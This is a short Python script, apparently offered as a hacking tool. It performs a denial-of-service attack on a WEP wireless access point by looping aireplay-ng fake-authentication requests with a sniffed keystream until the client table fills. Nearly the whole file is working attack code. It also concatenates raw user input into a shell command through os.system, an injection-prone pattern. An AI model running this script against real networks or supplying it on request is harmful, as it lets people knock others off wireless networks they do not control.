#/usr/bin/env python
###############################################
#    WEP FakeAuth DOS (Fills Client Table)     #
#            Author: Ed Tredgett 	       #
#         Email: edtredgett@gmail.com	       #
################################################

import os
from scapy.all import *

print """
To use this simple script you first have to sniff the WEP keystream, this can be done using airodump-ng.
Effectively all this script is, is a while loop! Enjoy :)
"""

count = 0
RMAC = RandMAC()
numtries = input("How many fakeauth requests do you wish to send: ")
bssid = raw_input("Enter the BSSID(MAC) of the target AP: ")
apname = raw_input("Enter the AP essid(Name): ")
channel = raw_input("Enter the AP channel number: ")
keystream = raw_input("Enter the keystream which you would like to use for multiple fake auth requests: ")

#This function send fake auth requests to the wireless AP using the specified keystream.
def authme():
	fakeauth = "aireplay-ng -1 0 -e " + "'"+ apname + "'" + " -y " + keystream + " -a " + bssid + " -h " + str(RMAC) + " mon0" 
	os.system(fakeauth)

#Keeps running the function untill the count reaches the number of fakeauth requests specified by the user.
while count != numtries:
	authme()
	count += 1
